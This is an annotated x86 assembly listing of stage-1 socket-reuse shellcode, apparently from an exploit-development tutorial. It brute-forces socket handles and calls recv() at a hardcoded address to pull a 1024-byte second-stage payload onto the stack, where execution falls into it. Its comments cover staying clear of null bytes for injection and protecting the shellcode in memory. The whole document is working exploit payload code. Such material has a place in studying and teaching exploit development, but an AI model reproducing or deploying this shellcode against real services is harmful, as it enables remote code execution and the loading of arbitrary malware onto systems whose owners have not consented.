sub esp,0x2             ; Move ESP pointer above our initial buffer to avoid
						; overwriting our shellcode
xor edi,edi             ; Zero out EDI (Anything XORed with itself is 0)
socket_loop:            ; Brute Force Loop Label
xor ebx,ebx             ; Zero out EBX (Anything XORed with itself is 0)
push ebx                ; Push 'flags' parameter = 0 
add bh,0x4              ; Make EBX = 0x00000400 which is  1024 bytes
push ebx                ; Push `len` parameter, this is 1024 bytes
mov ebx,esp             ; Move the current pointer of ESP into EBX
add ebx,0x64            ; Point EBX the original ESP to make it the pointer to
						; where our stage-2 payload will be received (And fallen into)
push ebx                ; Push `*buf` parameter = Pointer to ESP+0x64
inc edi                 ; Make EDI = EDI + 1
push edi                ; Push socket handle `s` parameter = EDI, For each loop we increment EDI
mov eax,0x776A23A0      ; We need to make EAX = 0x776A23A0 but we can't inject if there are null bytes in this.
call eax                ; Call recv()
test eax,eax            ; Check if our recv() call was successfully made
jnz socket_loop         ; If recv() failed, jump back to the socket loop where
						; EDI will be increased to check the next socket handle